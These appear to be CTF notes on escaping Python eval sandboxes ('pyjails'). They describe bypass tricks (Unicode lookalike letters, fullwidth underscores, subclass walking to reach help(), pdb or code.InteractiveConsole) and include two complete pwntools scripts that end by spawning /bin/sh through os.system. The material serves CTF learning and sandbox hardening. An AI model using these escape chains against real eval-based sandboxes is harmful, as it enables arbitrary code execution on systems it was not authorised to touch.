# Python jail

References:

- [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/)

## WHY2025 CTF TitleCase

Use unicode bypass to avoid `str.title()`.

Visit [here](../2025-08-08-why2025/misc/title-case.md).

## FortID CTF 2025 Michael Scottfield

Requirements:

1. Length <= 500: Easy to achieve
2. Allow `()` but no parameters: Use `pdb.set_trace()` or `code.InteractiveConsole().interact()`
3. No strings: Use docstrings and `str[index]` to create strings
3. No numbers: Use `True` as 1
4. No builtins: Use `().__class__.__base__.__subclasses__()`

Details [here](../2025-09-12-fortid-ctf-2025/michael-scottfield.md)

## UofTCTF 2024 Jail Zero

```python
def check(code):
    # no letters
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    # no numbers
    numbers = "0123456789"
    # no underscores
    underscore = "__"
    
    return not any((c in alphabet) or (c in numbers) or (underscore in code) for c in code)

def safe_eval(code):
    if (check(code)):
        g = {'__builtins__': None}
        l = {'__builtins__': None}
        return print(eval(code, g, l )) # good luck!
    else:
        print("lol no")
        
code = input(">>> ")
safe_eval(code)
```

Requirements:

1. No alphabetic: Use [Unicode Block “Mathematical Alphanumeric Symbols”](https://www.compart.com/en/unicode/block/U+1D400) to bypass
2. No numbers: Use `(''=='')` as 1
3. No double underscores: Use [FULLWIDTH LOW LINE](https://unicode-explorer.com/c/FF3F)
4. No builtins: Use `().__class__.__base__.__subclasses__()`

Then, we can use existing way to get to `code.InteractiveConsole().interact()`:

1. Locate `<class '_sitebuiltins._Helper'>` and `<class '_sitebuiltins._Printer'>` in `().__class__.__base__.__subclasses__()`
2. Call `help()` via `<class '_sitebuiltins._Helper'>` and load `code` module in help() system
3. Locate `sys` module via `<class '_sitebuiltins._Printer'>.__init__.__globals__`
4. Execute `sys.modules["code"].InteractiveConsole().interact()`

Attack script:

```python
from pwn import *

context(log_level="debug")


# unicode bypass helper
def transform(text):
    encoded = ""
    # full width low line
    underscore = chr(0xFF3F)
    text = text.replace("__", "_" + underscore)
    for ch in text:
        if ch.isalpha():
            if ch >= "a" and ch <= "z":
                encoded += chr(ord(ch) + 0x1D41A - ord("a"))
            elif ch >= "A" and ch <= "Z":
                encoded += chr(ord(ch) + 0x1D400 - ord("A"))
            else:
                assert False
        else:
            encoded += ch
    print("before", text)
    print("after", encoded)
    return encoded


# step 1. locate Helper and Printer
p = process(["python3", "chal.py"])
p.recvuntil(b">>> ")
p.sendline(transform("().__class__.__base__.__subclasses__()").encode())
res = p.recvline().decode()

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
print("Helper", helper_index)
print("Printer", printer_index)

# A is 10, B is 100

true = "(''=='')"
ten = "+".join([true] * 10)


def get_index(index):
    parts = (
        [true] * (index % 10) + ["A"] * (index // 10 % 10) + ["B"] * (index // 100 % 10)
    )
    return "+".join(parts)


# H for index of helper
helper = get_index(helper_index)
print(helper)


# find help text of helper
p = process(["python3", "chal.py"])
p.recvuntil(b">>> ")
p.sendline(
    transform(
        f"[A:={ten},B:=A*A,H:={helper},S:=().__class__.__base__.__subclasses__()[H].__doc__]"
    ).encode()
)
help_text = eval(p.recvline().decode())[-1]

# P for index of printer

printer = get_index(printer_index)
print(printer)


# synthesize "sys" and "code"
def synthesize(text):
    res = []
    for ch in text:
        index = help_text.index(ch)
        res.append("S[" + get_index(index) + "]")
    return "+".join(res)


p = process(["python3", "chal.py"])
p.recvuntil(b">>> ")
p.sendline(
    transform(
        f"[A:={ten},B:=A*A,H:={helper},P:={printer},S:=().__class__.__base__.__subclasses__()[H].__doc__,"
        # step 2. call help()
        + f"().__class__.__base__.__subclasses__()[H]()(),"
        # step 3. locate sys module
        + f"M:=().__class__.__base__.__subclasses__()[P].__init__.__globals__[{synthesize('sys')}],"
        # step 4. call sys.modules["code"].InteractiveConsole().interact()
        + f"M.modules[{synthesize('code')}].InteractiveConsole().interact()]"
    ).encode()
)
p.recvuntil(b"help> ")
# step 2. load code module in help() system
p.sendline(b"code")
p.sendline(b"quit")
p.sendline(b"import os")
p.sendline(b'os.system("/bin/sh")')
p.interactive()
```

## SECCON 2024 Quals 1linepyjail

```python
print(eval(code, {"__builtins__": None}, {}) if len(code := input("jail> ")) <= 100 and __import__("re").fullmatch(r'([^()]|\(\))*', code) else ":(")
```

Requirements:

1. Length <= 100: Try hard to reduce input length
2. Allow `()` but no parameters: Use `pdb.set_trace()`
3. No builtins: Use `().__class__.__base__.__subclasses__()`

Steps:

1. Locate `<class '_sitebuiltins._Helper'>` and `<class '_sitebuiltins._Printer'>` in `().__class__.__base__.__subclasses__()`
2. Call `help()` via `<class '_sitebuiltins._Helper'>` and load `pdb` module in help() system
3. Locate `sys` module via `<class '_sitebuiltins._Printer'>.__init__.__globals__` and execute `sys.modules['pdb'].set_trace()`

Attack script:

```python
from pwn import *

context(log_level="debug")

# step 1. locate Helper and Printer
p = process(["python3", "jail.py"])
p.recvuntil(b"jail>")
p.sendline("().__class__.__base__.__subclasses__()".encode())
res = p.recvline().decode()

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
print("Helper", helper_index)
print("Printer", printer_index)

# step 2. call help() to load pdb module
p = process(["python3", "jail.py"])
p.recvuntil(b"jail>")
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{helper_index}]()()"
    ).encode()
)
# load pdb and return to jail
p.sendline(b"pdb")
p.sendline(b"jail")
p.recvuntil(b"jail>")
# step 3. locate sys module and call `sys.modules['pdb'].set_trace()`
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}].__init__.__globals__['sys'].modules['pdb'].set_trace()"
    ).encode()
)
# in pdb
p.recvuntil(b"(Pdb) ")
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}].__init__.__globals__['sys'].modules['os'].system('/bin/sh')"
    ).encode()
)
p.interactive()
```
